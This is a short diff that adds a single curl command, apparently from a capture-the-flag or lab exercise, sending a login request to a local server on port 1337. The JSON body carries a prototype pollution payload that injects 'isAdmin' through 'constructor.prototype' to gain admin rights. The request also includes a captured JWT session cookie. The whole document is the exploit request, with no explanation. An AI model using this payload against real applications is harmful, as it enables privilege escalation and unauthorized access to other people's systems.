@@ -1,0 +1,15 @@
+curl 'http://0.0.0.0:1337/login' \
+  -X POST \
+  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0' \
+  -H 'Accept: */*' \
+  -H 'Accept-Language: en-US,en;q=0.5' \
+  -H 'Accept-Encoding: gzip, deflate' \
+  -H 'Referer: http://0.0.0.0:1337/login' \
+  -H 'Content-Type: application/json' \
+  -H 'Origin: http://0.0.0.0:1337' \
+  -H 'DNT: 1' \
+  -H 'Sec-GPC: 1' \
+  -H 'Connection: keep-alive' \
+  -H 'Cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImRheXV0aCIsImlhdCI6MTc3MDM0Mzg1MywiZXhwIjoxNzcwMzQ3NDUzfQ.xCM7a3jCQljX46v_z-4GCScg5yU7zgrNiy4yJAzFKck' \
+  -H 'Priority: u=0' \
+  --data-raw '{"username":"a","password":"a", "constructor": {"prototype": {"isAdmin": "YES"}}}'
